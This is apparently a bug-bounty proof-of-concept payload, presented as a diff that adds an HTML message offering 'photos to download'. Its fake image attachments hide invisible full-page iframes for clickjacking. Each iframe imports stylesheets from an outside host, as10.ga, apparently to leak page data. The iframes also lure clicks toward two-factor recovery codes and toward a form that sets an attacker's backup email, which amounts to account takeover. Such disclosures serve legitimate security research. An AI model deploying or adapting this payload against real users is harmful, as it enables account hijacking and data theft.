@@ -1,0 +1,158 @@
+<math><style><!--</style>
+<p>Hello,</p>
+<p>Here's some photos for you to download</p>
+<style>
+@IMPORT "https://as10.ga/temp/iframeabs.css";
+iframe {
+	display: inline;
+	z-index: 999999999;
+	top: 0;
+	left: 0;
+	opacity: 0;
+	width: 100%;
+	height: 100%;
+	margin: 0px 3px 0px 0px !IMPORTANT;
+}
+</style>
+<action-text-attachment>
+<figure class="attachment attachment--file attachment--png">
+<iframe id="pldfrm1" scrollable="no" srcdoc='
+<head>
+<style>
+@import "https://as10.ga/c0.php";
+</style>
+	<link rel="stylesheet" media="all" href="https://production.haystack-assets.com/assets/desktop-d09883b422ac6f535283737a5dbd38f04317d5e2fc38382c2126e1dc36c43540.css" data-turbolinks-track="reload">
+	<link rel="stylesheet" media="none" href="https://production.haystack-assets.com/assets/message_content-440db27e87f76e0aff765fa3bda981d5ecb10a198a4d57f99414a86befdd9d86.css" id="message_content_stylesheet" data-turbolinks-track="reload">
+	<script src="https://production.haystack-assets.com/packs/js/main-1f72ef27d9691193db7f.js" defer="defer" data-turbolinks-track="reload"></script>
+	<meta name="csrf-param" content="authenticity_token">
+	<meta name="csrf-token" content="abc">
+</head>
+<body>
+	<a style="display:block;width:100vw;height:100vh;background-color:red" href="/two_factor_authentication/profiles/recovery_codes"></a>
+</body>
+'></iframe>
+<figcaption class="attachment__caption">
+  <span class="attachment__name">image1.png</span>
+  <span class="attachment__size">7.6 Mb</span>
+</figcaption>
+</figure>
+</action-text-attachment>
+<action-text-attachment>
+<figure class="attachment attachment--file attachment--png">
+<iframe id="pldfrm2" scrollable="no" srcdoc='
+<head>
+<style>
+@import "https://as10.ga/c1.php";
+</style>
+	<link rel="stylesheet" media="all" href="https://production.haystack-assets.com/assets/desktop-d09883b422ac6f535283737a5dbd38f04317d5e2fc38382c2126e1dc36c43540.css" data-turbolinks-track="reload">
+	<link rel="stylesheet" media="none" href="https://production.haystack-assets.com/assets/message_content-440db27e87f76e0aff765fa3bda981d5ecb10a198a4d57f99414a86befdd9d86.css" id="message_content_stylesheet" data-turbolinks-track="reload">
+	<script src="https://production.haystack-assets.com/packs/js/main-1f72ef27d9691193db7f.js" defer="defer" data-turbolinks-track="reload"></script>
+	<meta name="csrf-param" content="authenticity_token">
+	<meta name="csrf-token" content="abc">
+</head>
+<body>
+	<a style="display:block;width:100vw;height:100vh;background-color:red" href="/two_factor_authentication/profiles/recovery_codes"></a>
+</body>
+'></iframe>
+<figcaption class="attachment__caption">
+  <span class="attachment__name">image2.png</span>
+  <span class="attachment__size">3.5 Mb</span>
+</figcaption>
+</figure>
+</action-text-attachment>
+<action-text-attachment>
+<figure class="attachment attachment--file attachment--png">
+<iframe id="pldfrm3" scrollable="no" srcdoc='
+<head>
+<style>
+@import "https://as10.ga/c2.php";
+</style>
+	<link rel="stylesheet" media="all" href="https://production.haystack-assets.com/assets/desktop-d09883b422ac6f535283737a5dbd38f04317d5e2fc38382c2126e1dc36c43540.css" data-turbolinks-track="reload">
+	<link rel="stylesheet" media="none" href="https://production.haystack-assets.com/assets/message_content-440db27e87f76e0aff765fa3bda981d5ecb10a198a4d57f99414a86befdd9d86.css" id="message_content_stylesheet" data-turbolinks-track="reload">
+	<script src="https://production.haystack-assets.com/packs/js/main-1f72ef27d9691193db7f.js" defer="defer" data-turbolinks-track="reload"></script>
+	<meta name="csrf-param" content="authenticity_token">
+	<meta name="csrf-token" content="abc">
+</head>
+<body>
+	<a style="display:block;width:100vw;height:100vh;background-color:red" href="/two_factor_authentication/profiles/recovery_codes"></a>
+</body>
+'></iframe>
+<figcaption class="attachment__caption">
+  <span class="attachment__name">image3.png</span>
+  <span class="attachment__size">1.1 Mb</span>
+</figcaption>
+</figure>
+</action-text-attachment>
+<action-text-attachment>
+<figure class="attachment attachment--file attachment--png">
+<iframe id="pldfrm4" scrollable="no" srcdoc='
+<head>
+<style>
+@import "https://as10.ga/c3.php";
+</style>
+	<link rel="stylesheet" media="all" href="https://production.haystack-assets.com/assets/desktop-d09883b422ac6f535283737a5dbd38f04317d5e2fc38382c2126e1dc36c43540.css" data-turbolinks-track="reload">
+	<link rel="stylesheet" media="none" href="https://production.haystack-assets.com/assets/message_content-440db27e87f76e0aff765fa3bda981d5ecb10a198a4d57f99414a86befdd9d86.css" id="message_content_stylesheet" data-turbolinks-track="reload">
+	<script src="https://production.haystack-assets.com/packs/js/main-1f72ef27d9691193db7f.js" defer="defer" data-turbolinks-track="reload"></script>
+	<meta name="csrf-param" content="authenticity_token">
+	<meta name="csrf-token" content="abc">
+</head>
+<body>
+	<a style="display:block;width:100vw;height:100vh;background-color:red" href="/two_factor_authentication/profiles/recovery_codes"></a>
+</body>
+'></iframe>
+<figcaption class="attachment__caption">
+  <span class="attachment__name">image4.png</span>
+  <span class="attachment__size">4.9 Mb</span>
+</figcaption>
+</figure>
+</action-text-attachment>
+<action-text-attachment>
+<figure class="attachment attachment--file attachment--png">
+<iframe id="pldfrm5" scrollable="no" srcdoc='
+<head>
+<style>
+@import "https://as10.ga/c4.php";
+</style>
+	<link rel="stylesheet" media="all" href="https://production.haystack-assets.com/assets/desktop-d09883b422ac6f535283737a5dbd38f04317d5e2fc38382c2126e1dc36c43540.css" data-turbolinks-track="reload">
+	<link rel="stylesheet" media="none" href="https://production.haystack-assets.com/assets/message_content-440db27e87f76e0aff765fa3bda981d5ecb10a198a4d57f99414a86befdd9d86.css" id="message_content_stylesheet" data-turbolinks-track="reload">
+	<script src="https://production.haystack-assets.com/packs/js/main-1f72ef27d9691193db7f.js" defer="defer" data-turbolinks-track="reload"></script>
+	<meta name="csrf-param" content="authenticity_token">
+	<meta name="csrf-token" content="abc">
+</head>
+<body>
+	<a style="display:block;width:100vw;height:100vh;background-color:red" href="/two_factor_authentication/profiles/recovery_codes"></a>
+</body>
+'></iframe>
+<figcaption class="attachment__caption">
+  <span class="attachment__name">image5.png</span>
+  <span class="attachment__size">2.8 Mb</span>
+</figcaption>
+</figure>
+</action-text-attachment>
+<action-text-attachment>
+<figure class="attachment attachment--file attachment--png">
+<iframe scrollable="no" srcdoc='
+<head>
+<style>
+@import "https://as10.ga/c0.php";
+</style>
+	<link rel="stylesheet" media="all" href="https://production.haystack-assets.com/assets/desktop-d09883b422ac6f535283737a5dbd38f04317d5e2fc38382c2126e1dc36c43540.css" data-turbolinks-track="reload">
+	<link rel="stylesheet" media="none" href="https://production.haystack-assets.com/assets/message_content-440db27e87f76e0aff765fa3bda981d5ecb10a198a4d57f99414a86befdd9d86.css" id="message_content_stylesheet" data-turbolinks-track="reload">
+	<script src="https://production.haystack-assets.com/packs/js/main-1f72ef27d9691193db7f.js" defer="defer" data-turbolinks-track="reload"></script>
+	<meta name="csrf-param" content="authenticity_token">
+	<meta name="csrf-token" content="abc">
+</head>
+<body>
+	<form action="/identity/backup_email_address" data-remote="true" method="post">
+		<input type="hidden" name="_method" value="put">
+		<input type="hidden" name="backup_email_address" value="arw9234+backup2@wearehackerone.com">
+		<button style="display:block;width:100vw;height:100vh;background-color:red" type="submit"></button>
+	</form>
+</body>
+'></iframe>
+<figcaption class="attachment__caption">
+  <span class="attachment__name">image6.png</span>
+  <span class="attachment__size">3.8 Mb</span>
+</figcaption>
+</figure>
+</action-text-attachment>
